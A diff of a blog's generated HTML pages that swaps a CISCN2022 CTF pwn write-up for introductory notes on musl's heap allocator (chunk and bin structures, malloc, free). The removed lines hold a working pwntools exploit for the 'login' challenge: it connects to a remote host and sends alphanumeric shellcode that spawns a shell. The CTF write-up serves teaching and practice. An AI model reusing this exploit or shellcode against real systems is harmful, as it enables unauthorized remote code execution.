@@ -20,21 +20,22 @@
     var CONFIG = {"hostname":"www.rabb1t.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="article">
-<meta property="og:title" content="CISCN2022初赛_pwn_部分wp">
-<meta property="og:url" content="http://www.rabb1t.xyz/2022/07/03/CISCN2022-pwn-wp/index.html">
+  <meta name="description" content="musl 库的一些基本知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="musl初识">
+<meta property="og:url" content="http://www.rabb1t.xyz/2022/08/25/musl%E5%88%9D%E8%AF%86/index.html">
 <meta property="og:site_name" content="Rabbit&#39;s hole">
+<meta property="og:description" content="musl 库的一些基本知识">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-07-03T02:21:06.000Z">
-<meta property="article:modified_time" content="2022-07-13T13:54:38.000Z">
+<meta property="article:published_time" content="2022-08-25T13:26:14.000Z">
+<meta property="article:modified_time" content="2022-08-25T13:30:15.820Z">
 <meta property="article:author" content="MEss@_Rabbit">
-<meta property="article:tag" content="writeup">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="CISCN">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://www.rabb1t.xyz/2022/07/03/CISCN2022-pwn-wp/">
+<link rel="canonical" href="http://www.rabb1t.xyz/2022/08/25/musl%E5%88%9D%E8%AF%86/">
 
 
 <script id="page-configurations">
@@ -47,7 +48,7 @@
   };
 </script>
 
-  <title>CISCN2022初赛_pwn_部分wp | Rabbit's hole</title>
+  <title>musl初识 | Rabbit's hole</title>
   
 
 
@@ -159,7 +160,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
-    <link itemprop="mainEntityOfPage" href="http://www.rabb1t.xyz/2022/07/03/CISCN2022-pwn-wp/">
+    <link itemprop="mainEntityOfPage" href="http://www.rabb1t.xyz/2022/08/25/musl%E5%88%9D%E8%AF%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/myavatar.png">
@@ -172,7 +173,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CISCN2022初赛_pwn_部分wp
+          musl初识
         </h1>
 
         <div class="post-meta">
@@ -181,16 +182,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2022-07-03 10:21:06" itemprop="dateCreated datePublished" datetime="2022-07-03T10:21:06+08:00">2022-07-03</time>
+              <time title="Created: 2022-08-25 21:26:14 / Modified: 21:30:15" itemprop="dateCreated datePublished" datetime="2022-08-25T21:26:14+08:00">2022-08-25</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-07-13 21:54:38" itemprop="dateModified" datetime="2022-07-13T21:54:38+08:00">2022-07-13</time>
-              </span>
 
           
 
@@ -203,17 +198,51 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <!-- pwn签到 -->
-
+        <p>musl 库的一些基本知识</p>
 <span id="more"></span>
 
-<h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的流程是登录执行shellcode，shellcode需要通过检测，使用alpha3生成一个可见字符串shellcode。</p>
-<p>生成的shellcode的内容为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> psize, csize;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>然后利用alpha3来将其转为可见字符形式，且这道题的shellcode的地址是存放在rdx中的，因此在使用alpha3时应该生成 call rdx。<a target="_blank" rel="noopener" href="http://blog.rabb1t.xyz/2022/02/08/alphanumeric-shellcode/">alphanumeric_shellcode</a></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">23231</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;msg: ro0t \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 1\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;msg: &#x27;</span>+shellcode+<span class="string">&#x27; \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 2\n&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>chunk：</p>
+<ul>
+<li>psize：prev_size</li>
+<li>csize：chunk_size</li>
+<li>*next：fd</li>
+<li>*prev：bk</li>
+</ul>
+<p>已分配的 chunk 之间是相互连续的，可以通过 psize 与 csize 访问;当 chunk 空闲时，是通过 next 与 prev 相连的。<br>当 flag==1 时，表示该chunk为小chunk，释放时放入bin; falg==0 时，表示该chunk为大chunk，释放时调用munmap。</p>
+<p>bin：</p>
+<ul>
+<li>lock[2]：用于锁</li>
+<li>*head：指向第一个 chunk 的 mem</li>
+<li>*tail：指向最后一个 chunk 的 mem</li>
+</ul>
+<p>bin 是一个管理空闲 chunk 的链式结构，当 bin 中空闲时，head 和 tail 都指向 bin 本身。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> split_merge_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>binmap：位图，每位对应一个bin</li>
+<li>bins[64]：bin数组，固定64个bin，表示可以有64个空闲chunk链表</li>
+<li>free_lock[2]：用于锁</li>
+</ul>
+<p>musl 中的分配区，与 ptmalloc 中的 arena 不同的是，并没有对 bins 有除了大小外的区分。</p>
+<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>大致流程：</p>
+<ol>
+<li>检查申请大小<ul>
+<li>n&lt;0:返回0</li>
+<li>n&gt;MMAP_THRESHOLD:调用 mmap 直接分配</li>
+</ul>
+</li>
+<li>获取 n 对应的 bin_idx，若该 idx 对应的 bin 不为空，则取出 chunk。</li>
+<li>若 bin 为空，则调用 expand_heap 来获取 chunk， expand_heap 的主要流程为：<ul>
+<li>无 brk，则先生成一个新 brk。有则判断是否满足所申请大小，满足则使用 brk</li>
+<li>brk 不满足，则会调用 mmap 直接申请一个 chunk。</li>
+</ul>
+</li>
+</ol>
+<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __libc_free(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接调用了 __libc_free 进行释放。</p>
 
     </div>
 
@@ -224,10 +253,9 @@
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
               <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
-              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-              <a href="/tags/CISCN/" rel="tag"><i class="fa fa-tag"></i> CISCN</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+              <a href="/tags/heap/" rel="tag"><i class="fa fa-tag"></i> heap</a>
           </div>
 
         
@@ -236,13 +264,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/05/27/FSOP/" rel="prev" title="FSOP">
-      <i class="fa fa-chevron-left"></i> FSOP
+    <a href="/2022/08/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22022-%E5%88%9D%E8%B5%9B-pwn/" rel="prev" title="巅峰极客2022-初赛-pwn">
+      <i class="fa fa-chevron-left"></i> 巅峰极客2022-初赛-pwn
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/07/07/covteamctf-pwn-wp/" rel="next" title="covteamctf_pwn_wp">
-      covteamctf_pwn_wp <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -301,7 +326,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#login-nomal"><span class="nav-number">1.</span> <span class="nav-text">login-nomal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">数据结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#malloc"><span class="nav-number">2.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#free"><span class="nav-number">3.</span> <span class="nav-text">free</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
